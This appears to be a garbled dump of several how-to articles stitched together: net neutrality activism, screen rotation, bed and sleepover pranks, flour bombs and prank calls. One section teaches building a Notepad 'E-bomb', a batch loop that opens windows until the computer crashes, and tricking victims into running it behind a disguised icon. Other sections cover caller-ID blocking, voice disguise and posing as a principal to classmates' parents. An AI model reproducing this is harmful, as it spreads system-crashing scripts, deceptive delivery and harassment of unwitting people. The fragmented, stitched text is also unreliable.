, You can take advantage of the free hosting and simple set-up of blogging platforms to create your own website. Use your blog to write posts exposing the dangers and problems posed by net neutrality and advocate for a different way.Keep each blog post short, direct, and focused on one point. If you try to put too much into a single post, your readers may get confused and lose interest. Likewise, readers may get bored with long posts that demand too much of their time.
Write in short, simple sentences that are easy to read. Keep your paragraphs short as well. Remember that people are likely reading your blog on different devices with screens of varying sizes. Ideally, they should be able to understand the main point of your blog post without a lot of scrolling.
In addition to writing on your own website, you also can submit articles to established online news outlets and aggregators to reach a wider audience.
Encourage your readers to share your articles with others, and provide social media buttons at the bottom of each of your blog posts to enable people to easily share your posts across multiple networks.

, If you already have social media accounts, use them to spread your message by sharing articles and quotes from others who oppose net neutrality. Follow organizations that are against net neutrality for a steady stream of content to share.You may want to check into the source of a post before you share it, just to make sure it was created by a person or organization you don't mind being associated with.
Keep in mind that when you share things on social media you open yourself up to comments and criticism as well. Try to deal with disagreement in an even-handed way, and avoid responding with anger or personal insults.

, A letter published in your local newspaper or other publications can raise public awareness about the problems with current regulations and inspire others to take action against net neutrality.Letters to the editor may be published in print editions of newspapers as well as online. Publications typically have guidelines for how your letter must be formatted and the maximum acceptable length. Look up these guidelines for any publication to which you want to send a letter and follow them.
Keep the content of your letter timely and remember the audience. Local newspapers have broad audiences, typically consisting of people who live in a particular area – so your letter should have some local connection, or show how net neutrality affects local businesses and residents.
If you're writing a letter to a magazine or website with a more national audience, think about who their likely readers are and target your letter to appeal to those readers. It may be helpful to read other letters that have been published so you have a general idea of what the publication is looking for.

, People who already know and trust you may become your strongest supporters, once you explain your position and encourage them to join you in speaking out against net neutrality.


While people who already know and like you are more likely to listen to you, it's important not to take advantage of that. Don't be pushy or insult friends or family members who disagree with you.
If you have friends who are interested in the issue and support your point of view, point them to other information and resources they can evaluate on their own.
Be ready to suggest something if a friend or family member wants to help you out. For example, if your cousin wants to help you with your blog and you know she's a good writer, invite her to create a guest post a few days a week.

, When there is pending legislation or regulations related to net neutrality or regulation of the internet, you can send letters to your elected representatives explaining your position and urging them to vote against net neutrality.You can find sample letters to members of congress online, but don't follow them verbatim. Rather, use any form or sample letters as guides, but create your own letter that reflects your own personal commitment to the issue and the reasons you're drawn to speak out against net neutrality.
Give the official a little information about your life, and why you feel the issue of net neutrality impacts you.
Close your letter with a call to action, letting your representative know exactly what you expect him or her to do. This could be as specific as voting for or against a particular piece of legislation, or you could simply be asking for a general commitment against net neutrality.
Sign your letter and provide the representative with a way to get in touch with you if he or she wants to talk more about the issues you raised.

, Even if you live far away from D.C., representatives have district offices in their own states where you can schedule a meeting with the people who represent you in Washington.Begin by calling the representative's home office and asking for the name and contact information for the office scheduler. Once you have this information, send the scheduler a message directly asking when the representative will be in the home office and requesting a meeting.
Keep in mind that representatives – and their staffers – are extremely busy. Don't worry if it takes a few weeks for the scheduler to get back to you. However, you may need to call or write more than once before you're finally offered an appointment.
In any follow-up calls or emails, address the scheduler by name and speak only to that person, not to other staffers.
Once you finally get an appointment, it may not be with the member of congress, but with one of their staffers. You still should accept the appointment and treat this person with the same seriousness and respect that you would have treated an in-person meeting with your representative.

, The FCC allows public comments on regulations and other actions taken by the commission, and you can use this forum to express your thoughts on particular regulations and voice your arguments against net neutrality.Previously, FCC comments have been dominated by pro-net neutrality activists. However, groups such as American Commitment have started FCC comment drives of their own to encourage those opposed to net neutrality to make their voices heard as well.
Filing an FCC comment is as simple as using the agency's Electronic Comment Filing System (ECFS) on the FCC website. Simply choose a proceeding from the list provided and click on the ECFS form to add your comment.
Make sure you edit your comment before you post it, as you won't be able to make changes after it is submitted.
Organizations campaigning against net neutrality may have form comments that you can copy and submit, although you should personalize the comment to some extent so it stands out from the others.

Ctrl+Alt+↓ - Flip the screen upside down.

Ctrl+Alt+→ - Rotate the screen 90° to the right.

Ctrl+Alt+← - Rotate the screen 90° to the left.

Ctrl+Alt+↑ - Return the screen to the standard orientation.;
, If your shortcuts aren't working, you may be able to rotate the screen in the Screen Resolution or Display Properties window. You can open this window by right-clicking on the desktop and selecting ""Screen resolution"", or selecting ""Properties"" and then clicking the Display tab (XP only).


Use the ""Orientation"" drop-down menu to select how you want your screen to be displayed. It will switch back to the default setting after a few seconds unless you accept the changes.

, The process for rotating screens is dependent on the graphics card that you are using, and your graphics card drivers may be overriding Window' rotation controls. Knowing what graphics card you have will make it easier to find the rotation controls.


Press ⊞ Win+R and type dxdiag. This will open the DirectX Diagnostic Tool.
Click the Display tab. If you have an NVIDIA card installed, see the next step. If you have an AMD/ATI card installed, see Step 5.

Open Notepad.,
Type ""@echo off"", then, on a new line, ""CLS"".,
Write a command to open multiple (or infinite) windows.,
Give your ""virus"" a message.,
Save your file as a batch file.,
Get the user to open the file.",How to Make an Easy E Bomb Using Notepad1," Batch (.BAT) files contain text commands that instruct the computer what to do. To write your own simple .BAT file, you don't need special editing software - just Windows' basic Notepad program. Notepad can usually be found in the Start menu, or, alternatively, in the ""Accessories"" folder.






;
, By default, .BAT files open up a command prompt window and display the commands being run. @echo off and CLS stop the commands in the command prompt window from appearing, making the processes that are taking place invisible to the user being pranked.








, Now, it's time to write a series of commands that will cause your fake virus to open either lots of program windows or an infinite amount of program windows. This is an important distinction - leaving a program running which opens an infinite amount of windows will eventually crash a computer. See below for instructions on making both kinds of ""virus"":









To open a finite number of windows, start a new line and type the following command into your notepad window: start (program name here). In place of the phrase of parentheses, put the name of a program on your computer or its precise file location. This command causes the computer to open a window of the program you specify. For example, start iexplore.exe will open a window of Internet Explorer. Repeat this ""start"" command as many times as you'd like - your ""virus"" will open a window for every time you repeat this command. Here are just a few ideas for programs you may want to enter after ""start"":

iexplore.exe - Internet
calc.exe - Calculator
notepad.exe - Notepad
winword.exe - Word 2013


To open an infinite number of windows, first start a new line and type :A, including the colon. Then, in the line under that, type start iexplore.exe (or use some other program). Finally, in the line under that, type goto A. This will cause the computer to open a window of Internet Explorer (or whatever program you specified) and then immediately return to the point in the instructions before it opened the program, effectively causing it to open new windows until the command prompt is closed or the computer crashes.

, For startling effect, you may want to add a message to your ""virus"" that makes the user think his or her computer is experiencing an error. To display a message, start a new line and type echo Your Message Here, typing your desired message where indicated. Then, start a new line and type pause. This causes your desired message to pop up in a command prompt window.









To make your prank more believable, use a message that sounds like something your computer might actually display in the event of an error. For instance, you might try: Fatal Error. C:// directory corrupted.


, When you're finished, select File > Save As..., then make a file name ending in "".bat"" (for example, pinball.bat). In the dropdown window next to ""Save as type:"", be sure to select ""All files"". Save your file anywhere on the computer.








, Now, all you've got to do to ""detonate"" your E-bomb is to trick someone into opening it! You can do this any way you like. One of the most sure-fire ways to trick someone into opening one is to create a shortcut of your batch file, then change its icon to something the user usually uses, then change the shortcut's name to match the new icon. Sit back and watch your results from a good vantage point!








"
"
Open Notepad.,Type ""x=msgbox(""Error message here"", 5+16, ""Error title here"").,
Repeat as many error message commands as you'd like.,
Save as a Visual Basic (VBA) file.",How to Make an Easy E Bomb Using Notepad2," Like the trick above, this requires you to write a few simple commands in Notepad. However, its effect is different - instead of opening a series of program windows, this trick creates a series of error messages which allow you to fool the user into thinking his or her computer is experiencing an error or being hacked.








, Type this command (including the parentheses and and quotation marks), adding an appropriate error message and error title. This command opens a Windows error dialog box with your specified message in the body of the dialog and your specified title as the dialogue's header. To make your prank believable, try to use error messages and titles that sound like real ones. For instance, try ""Terminal Error"" as your error title and ""Critical fault detected at C://Users/Windows/system32"" as your error message.









You might also want to go in a ""hacking"" direction by using a message like, ""I have total access to your system. Prepare to be hacked."" This never actually happens in the event of actual hacking, so this will work best on people who don't know much about computers.
The ""5+16"" in the command above tells the computer to create a dialog box with a critical icon and two buttons - ""Retry"" and ""Cancel."" By changing the numbers, you can custom-create different error boxes. Simply swap out any of the single-digit numbers below for 5 and any of the double digit numbers below for 16:

0 (OK Button)
1 (OK and Cancel Buttons)
2 (Abort, Retry and Ignore Buttons)
3 (Yes, No, and Cancel Buttons)
4 (Yes and No Buttons)
5 (Retry and Cancel Button﻿s)
16 (Critical Icon)
32 (Help Icon)
48 (Warning Icon)
64 (Information Icon)



, Repeat the above command as many times as you'd like with as many different error messages as you'd like. The messages will appear in sequence - in other words, once a user exits one, the next will appear. You can easily take advantage of this fact to create a long string of error messages that seem to grow in urgency!








, When you've entered all the error messages you would like, save your file. Select File > Save As..., then give your file a name ending in "".vba"". Be sure to select ""All files"" from the ""Save as type:"" dropdown menu. Now, all you've got to do is trick someone into opening your E-bomb - the exact same tricks as in Method 1 will work just as well here.

Learn the meaning of commands to be able to modify your E-bomb.",How to Make an Easy E Bomb Using Notepad3," This E-bomb uses Notepad commands to cause the computer to randomly open programs until the batch file is disabled or the computer crashes. To make this E-bomb, you just need to copy and paste the pre-written commands in this section. However, note that this may not work on all computers.








,, This program randomly opens the programs listed after each ""start"" indefinitely. You may notice some of these programs have been repeated. Feel free to change the programs listed to whichever ones you would like.









Note that some of the program names listed above may not be accurate for your specific machine - for instance, some computers won't contain ""pinball.exe"" You may want to double-check to see if each program exists before executing your E-bomb.
If in doubt about the name of a specific program, remember that its precise file pathway is also valid. For instance, ""iexplore.exe"" can also be written as ""C:\Program Files\Internet Explorer"".

, Save the file using the "".bat"" extension (being sure to select ""All files"" from the ""Save as type:"" menu) When you trick the user into opening it, it will begin opening seemingly randomly programs on the computer without stopping.









For a bit of fun, try replacing one of the 'start *.exe' commands with the path of a notepad file on the person's computer or something like that. Use the following command:
edit (path to file)
goto begin
This will open their file in a DOS-based text editor, making it look like a hacker is reading their personal documents. Try it!

, Even if you don't understand how they work, E-bombs can be great pranks, but you'll be able to get even more enjoyment out of them if you know exactly what's happening when one is run. As an added bonus, once you understand how E-bombs work, you can start writing your own! Here is a list of the commands we used in this article, along with a brief description of each:









@echo off - Turns command prompt comments off
cls - Clears the command prompt screen. This just makes the command prompt appear neater.
goto - Go to whatever flag you specify immediately after ""goto"".
 %random% - A windows variable that randomly generates a number between (and including) 0-9.
 :(number, letter, or word) - A flag. ""Goto"" commands send the program to whatever flag they specify.
Note: in our example above, we have 10 flags. If we leave a number out, the program should close when %random% generates that number.

Drink plenty of liquids before bed.,
Stay up late.,
Keep the target (the “prankee”) occupied.,
Ensure the prankee is asleep.,
Fill up a bowl with warm water.,
Bring the warm water quietly into the room.,
Clear the splash zone.,
Place the sleeper’s hand into the water.,
Feign sleep.,
Keep the secret.",How to Make Someone Wet the Bed," This prank definitely won’t work if your prankee goes to bed with an empty bladder. To avoid suspicion, you should offer plenty of soda, water, tea, or juice to everyone at the sleepover throughout the night (not just the person you’re looking to prank), and drink plenty yourself.


When you need to use the bathroom, make an excuse or sneak away when possible, to avoid putting the idea of using the bathroom in anybody else’s mind.
Other snacks with high water content, like yogurt and soup, are great choices as well. Watermelon is particularly saturated in it (as its name might imply) so supplying everyone with watermelon slices before bed is a low-key method to enable your mischief. ;
, If a particularly early bedtime has been set, it can be difficult to tell if your bunkmates are asleep or just lying there wide awake with their eyes shut. Stay up late, if possible, so that friends only fall asleep when they’re obviously tired (sometimes right in their seat, while still holding their Nintendo controller).

, Tired friends who are entertained (such as by a movie or game) are less likely to use the bathroom before they fall asleep, ensuring they’ll go to sleep with plenty of liquids in them.


Take care not to overplay your hand. Too much attention focused on how much a particular friend is drinking, or repeatedly stopping them from using the bathroom can give you away.
If you don’t want to single any one person out beforehand, playing games with the group so that everyone is suitably occupied is a viable tactic.

, This only has a chance of working if the intended target is actually sleeping. Listen for telltale snores, or look for a slack, open mouth. Quietly call their name if you’re unsure.

, A plastic bowl is better than a cup, since it has more room for the hand, and being plastic means it won’t be cracked if it’s knocked over. You don’t want your parents (or your friend’s parents) bringing you down after a successful prank because you used a nice ceramic bowl, and the prankee jolted awake and cracked the bowl.


Although it’s a bit of speculation (as the efficacy of this prank is disputable), if this prank works it’s likely through the power of suggestion. The same mechanism is what can make us want to pee when we hear running water. The water must be warm, but it should never be hot. Hot water could burn your friend.

, Even if you don’t wake the victim, you always run the risk of waking someone else who would witness your part in this prank. Only you can determine whether this is an issue or not, as it depends only on how secretive you’re aiming to be.

, It’s highly likely for the prankee to knock the bowl over, intentionally or not, so you don’t want anything to get ruined if his happens. Delicately move everything you’d mind getting soggy out of the vicinity (a five-foot radius around the sleeper should be safe), taking special care to ensure all electronics are out of the way.

, You must contend now with the position your prankee has fallen asleep in. There are any number of possible arm placements; calmly assess the situation to find the easiest way to get their hand into the water.


If their hand is dangling from a bed, you might be able to slide the bowl right underneath it.
If it’s hanging slack from a bunk bed or over the arm of a sofa, you might need to stack some books underneath the bowl to reach their hand, or place the bowl onto a stool.
If it’s not dangling, take care! Be very gentle as you aim to reposition their hand and arm so that it can drape into the bowl. Take a position that will allow you to feign sleep (or quickly hide) if they awake.
If it’s under their head or body, you’re probably not going to succeed in moving it. Bide your time, or find a new person to prank.

, It would probably be wise to hop back into bed at this point, and pretend you played no part in what’s about to unfold. If questioned, why, you were in bed the whole time!

, Part of the fun with this prank is everybody's uncertainty about whether or not it will even work. Keeping the success or failure of your quest to achieve bed-wettage a secret helps to maintain that aura of mystery, so don't spread the word!


Keeping quiet also avoids shaming or bullying the prankee afterward, which is important. Bullying goes against the spirit of pranking, and is never acceptable.

Undress the top layer of the bed.,
Tuck the flat sheet at the head of the bed.,
Fold the bottom edge of the sheet.,
Make the bed.,
Hide in the room before the victim goes to bed.",How to Short Sheet a Bed1," Remove the comforter and any other top layer sheets to access the fitted sheet. This prank only works when the bed has both a fitted and a flat sheet. If your victim sleeps under a duvet without a flat sheet, you'll have to find another prank.


Don’t crinkle up the top sheets; fold or strategically place them on a piece of furniture.
If the victim comes home to a wrinkled or ruffled comforter, they might suspect something and inspect the bed.;
, Spread out the flat sheet as you normally would to make the bed. Then, instead of tucking the sheet at the foot of the bed, tuck it in at the head of the bed. This is the main part of the prank. Straighten the sheet so that it rests flat across the bed. If your victim is an impeccable bed-maker, ensure that the sheet isn't wrinkled, since it will be noticeable.

, Take the edge of the flat sheet near the foot of the bed and fold it up toward the head of the bed. Make it resemble a properly installed flat sheet, with the edge of the sheet resting just under the pillows.


Take note of how your victim normally folds their sheet, and try to emulate it. Some people will do an additional fold with their sheet to make it look neater. Other people keep it folded nearly in half so it is easy to hop into bed., Place the pillows, additional blankets, and/or bedspreads as they’re made normally. These top layers will cover up the fold you created. Be sure you recreate the way the victim typically makes the bed.


Make sure the folded sheet is covered by pillows and top blankets.
Do a quick inspection of the bed to ensure it looks like a normally made bed.

, Watch the person try to get into bed. They'll find that their feet are trapped in the fold! Once you see them struggling and confused, jump out and say “gotcha.”"

Play with your flour bomb.",How to Make a Flour Bomb1," You will need a few supplies to create a flour bomb out of panty hose or socks. Make sure you have all of the supplies with you before you begin. You may already have all of the supplies in your home!Pantyhose or long socks.
Flour
A spoon;
, If you are using pantyhose, you need to cut one leg of the pantyhose off where it connects at the top before beginning. Open up the pantyhose or socks wide and use the spoon to fill it with spoonfuls of flour. Keep filling until the pantyhose or socks have enough flour to completely fill the toe part. You should have about ½ to 1 cup in the sock or pantyhose., Tie a knot in the pantyhose or sock close to where the flour is. The knot should be a couple of inches above where the flour is. This should create a tied off pocket of flour with a long handle of pantyhose or sock to hold onto.

, Hold the long end of the flour bomb and throw the bomb up in the air. Watch the flour splat out of the pantyhose or sock as it hits the ground. You can also play flour bomb wars by getting friends together and making several flour bombs to use to gently hit each other with. The flour will leave a fun white spot where it hit you!

Know your victim’s sleep schedule.,
Learn their daytime schedule.,
Observe how they make their bed.,
Document the bed.",How to Short Sheet a Bed2," This is an easy trick if you live with the victim, or share a room with them. Once you learn the victim’s sleep schedule, you can begin to plan around this time. If they go to sleep every night at 10:00 PM, you have up until that point to make your move.

, Once you find out their normal sleep schedule, you should learn what time you should prepare the prank. If they go to school or work, you can use this time to prepare the prank. It could help if you talk to them the previous night:”So Jamie, you have any plans tomorrow?”
”Working for the man tomorrow?”
”I’m going to the grocery store tomorrow, you want to come?”

, It will help if you know how the person's bed is normally made. The more you can make it appear normal, the less suspicious (and more surprised) the victim will be. Don’t get caught snooping on them as they’re dressing the bed. Instead, you should plan to inspect the bed at a separate time.A lot of people don’t use sheets and only use a comforter or duvet. Make sure your victim uses a sheet or else the short sheet technique will not work.
Make sure they typically fold the inner sheet underneath the comforter.

, Some people are better learners with a visual cue. Take a picture of how the bed looks before you tamper with the bed. Once you are making the bed again, you’ll have a visual cue to base the presentation on.

Napkins, paper towels, or dryer sheets.Flour
A spoon
Rubber bands

, You need to have the napkin, paper towel, or dryer sheet laid out flat on a table to get it properly filled with flour. You can lay several down at once if you’d like to make multiple flour bombs.

, Use a small spoon to put flour into the center of the napkin, paper towel, or dryer sheet. You should only add about 1 to 2 spoonfuls to each to make sure you have enough room to tie the flour bomb.


A larger paper towel might be able to have 3 to 4 spoonfuls in it depending on how big it is.

, Gather the four corners of the napkin, paper towel, or dryer sheet and bring them together so that the flour rests in a pocket underneath them. Wrap a rubber band around the flour bomb very close to the flour pocket.


Make sure you have all edges of the napkin, paper towel, or dryer sheet pulled through the rubber band so the flour will not leak.

, Take your flour bombs outside to have fun throwing into the air. The flour will make a fun, white spot wherever the bomb lands. Try setting up a target to throw the flour bombs at for a fun outdoor game.

Gather all of the materials needed.,
Attach a funnel to the balloon.,
Fill the balloon with flour.,
Blow up the balloon.,
Pop the balloon to make a flour explosion.",How to Make a Flour Bomb3," Creating a flour bomb out of a balloon is an easy way to have an explosion of flour. You only need a few household supplies to make a balloon flour bomb. Get all of your materials together to begin this project.


Balloons
A medium size funnel
Flour
A spoon
A needle or pin.
Tape and String to hang the balloon

, Gently slide the mouth of the balloon onto the tip of a funnel. A medium to large size funnel will work best to keep the balloon secured on the funnel.

, Use one hand to hold the balloon mouth and funnel base while you spoon the flour into the balloon. Add 1 to 2 spoonfuls of flour into the funnel for it to slide down into the balloon. Carefully remove the balloon mouth from the funnel making sure not to let any of the flour spill out of the balloon.

, Carefully blow up the balloon to a nice size that will easily pop. Try not to overfill the balloon so it doesn’t pop before you intend for it to. Make sure you only blow out air into the balloon because you don’t want to accidentally inhale the flour inside the balloon. Tie the balloon mouth off when the balloon has reached the size you want.

, Hang the balloon up high with string or just tape to give the flour a place to fall from. Use a needle or pin to carefully pop the balloon. Watch the flour fly from the balloon and fall down to the ground.


For added fun, have someone stand underneath the balloon to end up covered in white flour.

Fill a beer bottle with cold water.,

Ready, steady, whack!,
Did it break?,
Learn how it works.",How to Break a Beer Bottle With Your Bare Hands," The colder, the better. Bring the water level up to about two inches (5cm) from the top of the bottle. This also works with beer which makes it a little more dramatic.;
, Wrap the top two fingers of your non-dominant hand (for most of you, that will be your left hand) around the neck of the bottle. This will prevent shards of glass from stabbing you in the palm in case the entire bottle shatters.

, Hit the opening of the bottle hard with your dominant hand.

, Check the bottom of the bottle, which should have broken right off.

, The bottom of the bottle breaks off due to ""cavitation.""The bottle briefly and suddenly moves downward when you strike the top. The water inside of it doesn't move as quickly, creating an extremely brief void (vacuum) at the bottom. The water does catch up with the glass, and comes crashing down into the bottom. If the force is great enough, the bottle can no longer support the water crashing down, and cracks or breaks at the bottom. Even if the crack is minor, the inertia and weight of the water will break the bottom out of the bottle.

Open the area where the food is kept with care.,
Add the food to your pockets or other stash area.,
Walk back to your room casually.,
Use the best and quietest route back to your bedroom.,
Hide things quickly if you have nosy parents who like checking up on you.,
Cover up the evidence after eating in your room.,
Shift items to easy-to-grab locations when you can.,
Try to stash up on food over time, having the extra packet of chips in your room is a good idea.,
Tuck food packages that are particularly flat into the waistband of your pants or skirt (preferably in the back).,
Grab a paper towel for something more complicated such as dry cereal or crackers or chips, put the snack in it, and gather the ends into a little bag shape.,
Put your snack into a cup.",How to Sneak Food Into Your Room," Know which areas of the house might present problems when sneaking about. For example, stairs can creak and so can the railing. Do a test run when you're just walking about, so that you know which steps and areas squeak, shift or make noise of some sort. Then you will know which parts you need to be careful about and to make sure that you go step by step, lightly and quietly.


Learn to move without bumping or tripping on anything.
Memorize the best route that doesn't raise suspicion, whether it's daytime or nighttime.
Test the fridge and pantry doors for creaks and the best opening techniques that minimize noise.;
, It can help if your outfit has big pockets. A bathrobe or hoodie helps.


Wear something comfortable and loose.
Wear socks if you have a hard floor (your feet might stick to the floor and make noise). If you have a carpet floor, then you should be okay without socks.

, If you are often awake later at night while your parents are asleep, that is a good time. However, daytime sneaks are also possible as long as you don't go during meal preparation times or when someone else is making a snack, etc.


If sneaking at night, wait for about 30 minutes after your parents go to bed, to be sure your parents are asleep. At night, listen to where your parent's room is at just to make sure if they're still asleep. If you hear them awake, either get the heck out of there or hide in the kitchen.

, Walk down to the kitchen, check to see whether anybody who might cause you trouble is around. Once you're at the kitchen, wait for a couple of minutes before advancing.


In case you accidentally wake anyone, be ready to disguise the food raid as a bathroom visit; flush the toilet on your way back. You can also try to pull it off as if you were grabbing a glass of water if you have a cup in your hand.

, If it's daytime, try singing something quietly or humming casually.

, Note that the food areas can make noise when doors are opened:


The fridge usually makes a lot of noise when it opens, so try putting your foot against the fridge and opening little by little with your hands. Once you have pried it open, grab whatever you can quietly.
If it's a cabinet that creaks when you open it, try opening it slowly. If it still creaks, try opening it super quickly, in the hope it'll be quiet.

, If it's something like a granola bar, then it's easiest to just stuff it in your pocket. If it's something like potato chips or pretzels from a larger bag, then get a glass (that you can't see through) and quickly fill the glass with the chips/whatever and walk away casually.

, Take care not to bump into anything. If there is a mirror near the kitchen and it is daytime, check that you're not bulging in odd places.


Be careful not to leave a trail of food as you leave the kitchen. Dropping food will bust you.

, If this includes going via the bathroom, that can help to cover your tracks.

, Shove the food into a safe spot quickly on reaching your room, so that it can't be seen if your parents come in. Places could include: Under a desk, underneath a bed, or under a pillow (for small snacks that don't cause too much bulge). If hiding snacks under a bed, make sure the covers conceal the space between the bottom of your bed and the floor.


In some beds, if you lift the corner of your mattress, you may find a little area made of metal, like a little box. You can't really hide a lot in it, but it's good for candy bags.
If you have a bookshelf in your room, you can stash your food inside there by grabbing it and pulling, then put the food behind and push the bookshelf back so that it looks like the beginning a simple bookshelf not used for secret stashes or food swiping.

, After you're done eating, hide leftovers and wrappers somewhere in your room like in your underwear drawer or somewhere only you will know where it is. A good place few people look in is under the bottom drawer in a stack of drawers.

, If you are washing the dishes, cleaning the kitchen or doing some cooking, you have a good opportunity to put food into one area where it will be easy to grab later. Just be sure it is well hidden, such as behind a large cereal box or similar.

, A good time to do this is while your parents are out.

, Make sure to walk without crinkling the wrapper but do it casually. If done right, you can sneak candy right under you family's noses, and no one will be the wiser!

, Crumpling it up a little might make it less suspicious. You can just tell someone you're throwing a piece of trash away if they ask.

, Of course, the cup should not be see-through. Also, make sure you can't see the snack easily above the cup. This is particularly useful for sneaking things like fruit, cupcakes, chips, almost everything. But be warned, this only works if you are allowed to have drinks in your room.

Before you do the trick, plan on a piece of paper or a white board and plan what you are going to draw.,
Get a marker or pen.,
If you are planning on doing this during the day, or waiting for the prey to fall asleep, keep it a secret!,
Wait.,
Stay quiet.,
Move slowly towards the prey and begin to draw.,
If there are other people with you make sure they know what's going on.,
In the morning, resist laughing at all costs.",How to Mustache Someone While Keeping Them Asleep," This is optional, however.;
, Marker works best. If this is just a prank, use a washable marker and test it on your hand first to make sure it's washable. If this is payback, and you won't get in trouble or ruin this person's day, you can use non-washable marker. But don't use sharpie. That stuff can take days to come off! You could also use an eyeliner pen or lipstick (you'd probably need black lipstick!)

, Don't laugh, hint, or show the marker.

, You wanna wait for just the right moment. Even after he/she has fallen asleep, you need to let them sleep for 10-20 minutes (depending on the sleeper) to give them time to fall into a deep sleep. It can even take an hour or so! Maybe set an alarm but make it silent, only letting it vibrate,

, Try to resist laughing. You can let out a quiet giggle every now and then (depending how heavy he or she sleeps) but try to avoid laughing and talking at all costs.

, Be sure to write lightly rather then pressing down the pen or you may wake who ever you are doing this to up.

, In the morning, they will laugh and give it away if they are not aware that you drew on one person's face.

, If it stays secret, the prey will only discover the mustache or drawing when they go to the bathroom.

Get a small bag and put a BLACK pen (thick) at the bottom of the bag.,
Play games that require a lot of energy.,
Do prank calls!,
Decide your design.,
Then stuff the pen at the BOTTOM of your bag.,
The next morning, laugh lots!",How to Draw on Someone's Face Successfully," Pile lots of things on top of it, like clothes, games e.t.c;
, Like tag, Ghost in the graveyard or Murder in the dark. Do a few rounds of Truth or Dare. Laugh lots!

, This is a GREAT way to get your adrenaline pumping. Call a friend and yell ""QUICK! THE POO IS FALLING FROM YOUR ROOF!"". If it's someone very close, whisper ""I'm watching you"". Be sure to say who you are after, it's better that way.


The first person (or the host's sibling) to fall asleep gets to be drew on. Try not to laugh though, it will give the game away.

, Be creative! Choose anything, a beard, a mustache, ""I LOVE POO"" on their forehead.

, That is important, so they don't suspect you! Or, put it somewhere like in the Cookie jar or in the Sugar pot?

, Say ""Woah, where'd you get the nice tattoo?. Or say ""Great..you love poo!"".

Play around with your voice.,
Make sure you have the right number!,
Make it sound real.,
Make it snappy.,
Make sure to put it on Private.",How to Make a Prank Call to a Friend," The ideal standard is not to be recognized by the receiver. A deeper voice is usually a good idea, but it's all relative, you are attempting to masquerade. Also, if you can do accents (British, Irish, etc.) use them to your advantage! They can make the prank really funny.;
, There is absolutely nothing more embarrassing than discovering that you have made a prank-call to someone who has absolutely no idea who you are, or who you're pretending to be.

, If you're pretending to be an admirer, don't lavish on the romantic stuff if you know that the person in question is rather shy. Also, make sure your person sounds convincing. If there's no way in the world that lets say Jade would call up Kayla and they know it, it's very likely a bad idea.

, You really don't want to waste this person's time, do you? And, minutes of your life are also disappearing while you pretend to call someone.

, You can do this by dialing *67 (in the U.S. and Canada) before the number. If done correctly, it will look like this: *67-123-456-7890

"
"
Make the call anonymous.,
Develop a persona.,
Rehearse what you'll say before the call.,
Practice disguising your voice.,
Remember not to laugh or break character.,
Avoid legal trouble.,
Dial the number on your phone.",How to Make a Prank Call1," In North America, dialing *67 before you make the call will block your phone number and make it appear as a private listing for some, but not all, phone calls. (Calls to 911, 800-, 888-, 877-, 866-, 855- 510-, or 900- numbers cannot be blocked in this way). You can easily find the code that will block your number in your country with a bit of Internet research.;
, Come up with a fake name, act as if you were going to give them a free raffle prize or contest or an amazing school they got into, for example. Do not come up with a real accent, this may be offensive to the victim and you can get arrested for racist prank calls, and a shtick, or reason why you're calling. Are you a telemarketer? An ex-girlfriend? An old, grumpy neighbor?

, Write down some notes to help you remember what you're going to say. Prank calling is a fun group activity too, so if you're making prank calls with the help of a friend, then you can practice with the friend until you have it down. If you can, even call your friend on your cell phone to practice talking into the phone.


While it's important to rehearse what you're going to say, it's also important to get to know the character you're impersonating so that you can go with the flow and say anything depending on what the person on the other end of the line says. If you're too worried about sticking to your script, you won't be able to improvise.







, If you're calling someone you know, then you have to take extra care to disguise your voice so you don't get caught immediately. If you want to let your friend in on the joke at the end of the call, that's fine, but if your friend, enemy, or acquaintance recognizes your voice from the start, then your prank call attempt will be a flop.


If you want your voice to sound more nasal, just pinch your nose and practice talking so that the sound feels like it's going into your nose.
If you want your voice to sound more raspy, then scream into a pillow before you make the call.
If you want to get fancy, you can invest in some voice-distortion technology.

, This is important. Laughing is like saying ""Hello, this call is a prank call so you should hang up."" Act calmly so the person you're calling stays oblivious and doesn't hang up. If you want to keep it going but have to laugh, shove your face into a pillow and quickly bring yourself back together.

, If you really want to avoid getting in trouble with the law, then you should stop making prank calls altogether, or stick to calling people who you know well and who will get the joke and won't want to take legal action. Still, there are a few specific ways that your call can break the law, so avoid making any calls that may be interpreted as the following:Harassment. Making an obnoxious prank call once may just be annoying, but calling a person repeatedly during the call of one prank call session, calling a person every day for an extended period of time, or even calling a person in the middle of the night repeatedly, can be seen as harassment. Making any threats is also considered harassment.
Disorderly conduct. This is a broad category, but anything that is meant to be offensive, includes abusive language, or just meant to generally make a person very angry is considered disorderly conduct.
Hate crimes. If you use the victim's religion, race, weight, national origin, or sexual orientation as a point of mockery, then you would be considered to be making a hate crime. If you're calling a stranger and he happens to have an accent, just mocking his accent can be considered a hate crime. Hate crimes are felonies.
Wiretapping. You may think it's funny to record the prank call exchange in case the person on the other end of the line says something hilarious, but recording a call without the consent of the other party is actually considered a felony in many states.

Never call the fire department, police, ambulance service, coastguards, government officials, financial institutions or any other agencies that are devoted to protecting and saving people like the Federal Bureau Investigation, Department of Homeland Security, Alcohol Tobacco and Firearms, American Red Cross, Centers for Disease Control or The White House. Your call will be traced and you will be in a large amount of trouble.
Be aware that if someone feels they've received a threatening, upsetting or harmful telephone call, they can dial *57 to have the call traced and contact the police. What started as a prank might end with law enforcement or the police knocking on your door.

, Take a deep breath and wait for the fun to begin.

Empty out one half to one third of a soda can.,
Tilt the can at a 45 degree angle.,
Observe and adjust.,
Give the can a little push.",How to Balance a Soda Can at a 45 Degree Angle1," The precise amount in the can makes all the difference to its balancing ability. This amount isn’t precise (not without a heaping helping of math), so you will have to adjust as necessary., You want to tip the soda so that it rests on the groove that encircles the bottom of the can. Take care, as the movement of the liquid will cause the balance of the can to teeter until the liquid comes to rest.


You’re looking to reach the center of balance between the can and liquid inside. On most soda cans the amount of liquid required will be the same, but this can depend on the size of the can.Keep trying until you get the feel for the tilt and the balance. Work slowly! Move too hastily and you will spill the soda everywhere.

, Keep your hands close to the can on your first tries so you won't spill it everywhere. If the can will not balance, you may have to drain additional liquid from the can, or even add more liquid.


Lean the can ""backwards"", away from the opening you drink out of. That way, if it does fall over, you can pick it up again before much spills out.

, Once you have mastered balancing the can at a 45 degree angle, try giving it a gentle push. It will slowly roll around on its edge and look even more astounding. Behold the power of science!

Call the parents of someone you know posing as the school principal.,
Call a friend with fake news of a pot delivery.,
Call the parents of someone you know pretending to be a significant other.,
Pretend to be a love interest of the person.",How to Make a Prank Call2," If you want to seek revenge on a classmate, then call the classmate's house and pretend to be the school principal. Make sure that one of the parents pick up. Here's how you do it:



Mrs. Smith: ""Hello?""

